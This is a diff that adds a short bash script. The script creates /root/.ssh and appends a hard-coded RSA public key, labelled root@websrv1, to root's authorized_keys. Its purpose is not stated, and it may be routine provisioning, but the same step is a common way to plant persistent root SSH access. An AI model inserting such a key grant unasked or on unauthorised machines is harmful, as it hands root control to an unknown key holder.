@@ -1,0 +1,5 @@
+#!/usr/bin/env bash
+
+mkdir /root/.ssh/
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAuAJh5U64hMndnp5XuKlAwxPK+sZncC8YZA3fB0kFKPGOOyCB9k+JbcpSeQZdeD5AWcjvN0KcYhovTr1J+Zxs1xDzC3RnsH7w71POfDfRhyZ41kmqBJDmWTKg6nkz/RjynHQrUB2gBbOkNCF8LQYeouaNgBJqqLnDo+N3Qfey/lfkIbvY54vhV3Afi3m5udCnqfEdWS2GkrUnIF2IeJjo2J9weIAhPN1H6o9abbS7L6XEmEEWQAiOL+51LbRbcSunrYcTrHA9qSwAZVAjXhLG0rp99t8MG63drdCDqwoEDSD+CKDdZNrLaFsrctu+LVdGL74Pyt5QwbUOg6RTrs6lsw== root@websrv1" >>/root/.ssh/authorized_keys
+
